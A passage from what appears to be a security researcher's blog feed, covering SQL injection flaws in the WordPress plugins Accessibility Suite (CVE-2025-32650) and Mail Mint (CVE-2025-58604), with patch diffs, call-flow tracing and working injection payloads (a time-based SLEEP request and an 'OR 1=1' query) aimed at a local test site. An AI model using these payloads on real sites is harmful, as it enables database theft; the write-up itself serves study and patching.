tables:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;UNION&lt;/strong&gt; — works even when the base query returns no rows, but you must find the correct column count.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Subquery&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;In WHERE clause:&lt;/strong&gt; MySQL may optimize it away if results are predictable.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;In FROM clause:&lt;/strong&gt; The subquery executes first to create a temporary table, ensuring the injected query runs.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png&#34;&#xA;    alt=&#34;SQL Execution Order&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;SQL Execution Order Diagram&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;extracting-the-first-letter-of-the-database-name&#34;&gt;&lt;span&gt;Extracting the First Letter of the Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#extracting-the-first-letter-of-the-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;To fully dump data, we first confirm that SQLi allows reading at least &lt;strong&gt;one character&lt;/strong&gt; from the database name.&lt;/p&gt;&#xA;&lt;p&gt;Use this payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=ONLINE_ADAv4/save_false_positive&amp;amp;issue_id=1&amp;amp;scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The query uses &lt;code&gt;SUBSTRING()&lt;/code&gt; to extract the first character of the database name.&#xA;If it equals &lt;code&gt;&#39;w&#39;&lt;/code&gt; (&lt;code&gt;0x77&lt;/code&gt; in hex), it triggers &lt;code&gt;SLEEP(5)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Since &lt;code&gt;scan_id&lt;/code&gt; is escaped, hex encoding ensures payload integrity.&lt;/p&gt;&#xA;&lt;p&gt;👉 Based on the delayed response — the first character &lt;strong&gt;is indeed &lt;code&gt;w&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability &lt;strong&gt;CVE-2025-32650&lt;/strong&gt; in the &lt;strong&gt;Accessibility Suite&lt;/strong&gt; WordPress plugin (before version 4.19) stems from &lt;strong&gt;improper use of &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt;&lt;/strong&gt;, leading to a SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;The official patch correctly uses &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt;, ensuring safe handling of user input.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Always use &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; correctly when interacting with the WordPress database.&lt;/li&gt;&#xA;&lt;li&gt;Keep plugins updated and perform regular security audits to prevent exploitation.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection Cheat Sheet – PortSwigger&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/online-accessibility/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Accessibility Suite Plugin &amp;lt;= 4.18 is vulnerable to SQL Injection&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;</description>
    </item>
    <item>
      <title>CVE-2025-58604 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-09-25-cve-2025-58604/</link>
      <pubDate>Thu, 25 Sep 2025 21:13:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-09-25-cve-2025-58604/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;The vulnerability occurs in the &lt;strong&gt;Mail Mint&lt;/strong&gt; plugin for WordPress prior to version &lt;strong&gt;1.18.6&lt;/strong&gt;. This flaw allows attackers to directly interact with the database — potentially leading to information disclosure or data theft.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-58604&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-58604&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/mail-mint/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Mail Mint Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.18.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS Severity&lt;/strong&gt;: Low (7.6)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Mail Mint&lt;/strong&gt;: v1.18.5 (vulnerable) and v1.18.6 (patched)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; or any comparison tool to visualize the code difference between versions&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerable function directly inserts user input into an SQL query &lt;strong&gt;without using proper sanitization or query preparation&lt;/strong&gt;, leading to an SQL Injection vulnerability.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Use any diff tool to compare the vulnerable and patched versions.&#xA;There is a clear difference in the file &lt;strong&gt;/app/Utilities/Helper/Import.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0)&#xA;{&#xA;    // other logic&#xA;&#xA;    global $wpdb;&#xA;    $total_query = &amp;#34;SELECT COUNT(DISTINCT user_id) as total&#xA;                    FROM {$wpdb-&amp;gt;prefix}usermeta&#xA;                    WHERE meta_key IN (&amp;#39;&amp;#34; . implode(&amp;#34;&amp;#39;, &amp;#39;&amp;#34;, $keys) . &amp;#34;&amp;#39;)&amp;#34;;&#xA;&#xA;    $total = $wpdb-&amp;gt;get_var($total_query); //phpcs:ignore&#xA;&#xA;    // Final query to retrieve user IDs with limit and offset.&#xA;    $final_query = &amp;#34;SELECT user_id&#xA;                    FROM {$wpdb-&amp;gt;prefix}usermeta&#xA;                    WHERE meta_key IN (&amp;#39;&amp;#34; . implode(&amp;#34;&amp;#39;, &amp;#39;&amp;#34;, $keys) . &amp;#34;&amp;#39;)&#xA;                    GROUP BY user_id&#xA;                    LIMIT $number OFFSET $offset&amp;#34;;&#xA;&#xA;    $users = $wpdb-&amp;gt;get_results($final_query, ARRAY_A); //phpcs:ignore&#xA;&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch replaces direct string concatenation with the safer &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; method.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0)&#xA;{&#xA;    // other logic&#xA;&#xA;    global $wpdb;&#xA;    // Total query (safe with prepare)&#xA;    $total_query = $wpdb-&amp;gt;prepare(&#xA;        &amp;#34;SELECT COUNT(DISTINCT user_id) as total&#xA;        FROM {$wpdb-&amp;gt;usermeta}&#xA;        WHERE meta_key IN ($placeholders)&amp;#34;,&#xA;        $keys&#xA;    );&#xA;&#xA;    $total = $wpdb-&amp;gt;get_var($total_query); //phpcs:ignore&#xA;&#xA;    // Final query with LIMIT &amp;amp; OFFSET (safe with prepare)&#xA;    $final_query = $wpdb-&amp;gt;prepare(&#xA;        &amp;#34;SELECT user_id&#xA;        FROM {$wpdb-&amp;gt;usermeta}&#xA;        WHERE meta_key IN ($placeholders)&#xA;        GROUP BY user_id&#xA;        LIMIT %d OFFSET %d&amp;#34;,&#xA;        array_merge($keys, array($number, $offset))&#xA;    );&#xA;&#xA;    $users = $wpdb-&amp;gt;get_results($final_query, ARRAY_A); //phpcs:ignore&#xA;&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/diff.png&#34;&#xA;    alt=&#34;Patch Diff&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Patch Diff&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How It Works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The vulnerability resides in the function &lt;code&gt;get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0)&lt;/code&gt; inside the &lt;code&gt;Import&lt;/code&gt; class.&#xA;To trace its usage, search for the keyword &lt;code&gt;get_wp_users_by_learndash_with_limit_offset&lt;/code&gt; in the plugin directory.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/search_import.png&#34;&#xA;    alt=&#34;Search Import&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search Import&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;The function is called inside:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;retrieve_contacts_associated_with_learndash()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;perform_learndash_user_import()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;These functions belong to the &lt;code&gt;ContactImportAction&lt;/code&gt; class in &lt;strong&gt;/app/API/Actions/Admin/Contact/ContactImportAction.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Next, searching for &lt;code&gt;retrieve_contacts_associated_with_learndash&lt;/code&gt; reveals it is used inside another method:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/search_1.png&#34;&#xA;    alt=&#34;Search 1&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search 1&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;This function is invoked by &lt;code&gt;map_contacts_with_learndash()&lt;/code&gt; in the &lt;code&gt;ContactImportController&lt;/code&gt; class located in &lt;strong&gt;/app/API/Controllers/Admin/Contact/ContactImportController.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Further tracing &lt;code&gt;map_contacts_with_learndash&lt;/code&gt; shows it is registered as a REST API callback:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/search_2.png&#34;&#xA;    alt=&#34;Search 2&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search 2&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;pre&gt;&lt;code&gt;class ContactImportRoute extends AdminRoute {&#xA;    public function register_routes() {&#xA;        register_rest_route(&#xA;            $this-&amp;gt;namespace, // mrm/v1&#xA;            $this-&amp;gt;rest_base . &amp;#39;/learndash/map&amp;#39;, // contacts/import/learndash/map/&#xA;            array(&#xA;                array(&#xA;                    &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::CREATABLE, // POST&#xA;                    &amp;#39;callback&amp;#39;            =&amp;gt; array( $this-&amp;gt;controller, &amp;#39;map_contacts_with_learndash&amp;#39; ),&#xA;                    &amp;#39;permission_callback&amp;#39; =&amp;gt; PermissionManager::current_user_can(&amp;#39;mint_manage_contacts&amp;#39;), // Admin&#xA;                    &amp;#39;args&amp;#39;                =&amp;gt; array(&#xA;                        &amp;#39;selectedCourses&amp;#39; =&amp;gt; array(&#xA;                            &amp;#39;description&amp;#39; &#x9;&#x9;=&amp;gt; __( &amp;#39;The selected courses from which to import contacts.&amp;#39;, &amp;#39;mrm&amp;#39; ),&#xA;                            &amp;#39;required&amp;#39;    &#x9;&#x9;=&amp;gt; true,&#xA;                            &amp;#39;type&amp;#39;              =&amp;gt; &amp;#39;array&amp;#39;,&#xA;                            &amp;#39;sanitize_callback&amp;#39; =&amp;gt; &amp;#39;rest_sanitize_array&amp;#39;,&#xA;                            )&#xA;                        ), // array &amp;#43; required&#xA;                ),&#xA;            )&#xA;        );&#xA;        // other logic&#xA;    }&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Call flow:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;A &lt;code&gt;POST&lt;/code&gt; request is made to &lt;code&gt;/wp-json/mrm/v1/contacts/import/learndash/map&lt;/code&gt; with the required parameter &lt;code&gt;selectedCourses&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;The callback &lt;code&gt;map_contacts_with_learndash(WP_REST_Request $request)&lt;/code&gt; receives the request.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The &lt;code&gt;$request&lt;/code&gt; object is converted to an array &lt;code&gt;$params&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;The callback then calls &lt;code&gt;retrieve_contacts_associated_with_learndash($params)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;That function finally calls &lt;code&gt;get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0)&lt;/code&gt; where:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$courses = $params[&#39;selectedCourses&#39;]&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$keys&lt;/code&gt; is an array built from all &lt;code&gt;value&lt;/code&gt; fields in &lt;code&gt;$courses&lt;/code&gt;, concatenated like &lt;code&gt;course_{COURSE_ID}_access_from&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Before being inserted into the SQL query, the &lt;code&gt;$keys&lt;/code&gt; array is merged into a string using &lt;code&gt;implode()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;The query is executed and returns a JSON response with &lt;code&gt;formatted_users&lt;/code&gt; and &lt;code&gt;total_users&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;After analyzing the code, it’s clear that the &lt;code&gt;selectedCourses&lt;/code&gt; parameter undergoes several transformations before being injected into the vulnerable SQL query — but the attacker still controls the &lt;code&gt;value&lt;/code&gt; key.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;POST request using BurpSuite:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;A single key can be used to easily control the final SQL query.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-25-cve-2025-58604/request_success.png&#34;&#xA;    alt=&#34;Get all user info&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Get all user info&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;The resulting query looks like this:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT user_id &#xA;FROM wp_usermeta &#xA;WHERE meta_key IN (&amp;#39;course_abc&amp;#39;) OR 1=1 -- _access_from&amp;#39;) GROUP BY user_id LIMIT 5 OFFSET 0&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;)&lt;/code&gt; escapes the &lt;code&gt;IN&lt;/code&gt; clause&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1=1&lt;/code&gt; is always true → returns all user IDs from &lt;code&gt;wp_usermeta&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;The rest of the function retrieves metadata for all returned users:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$formatted_users = array_map(&#xA;    function ($user) {&#xA;        $user-&amp;gt;usermeta = array_map(&#xA;            function ($user_data) {&#xA;                return reset($user_data);&#xA;            },&#xA;            get_user_meta($user-&amp;gt;ID)&#xA;        );&#xA;        return $user;&#xA;    },&#xA;    $contacts&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; 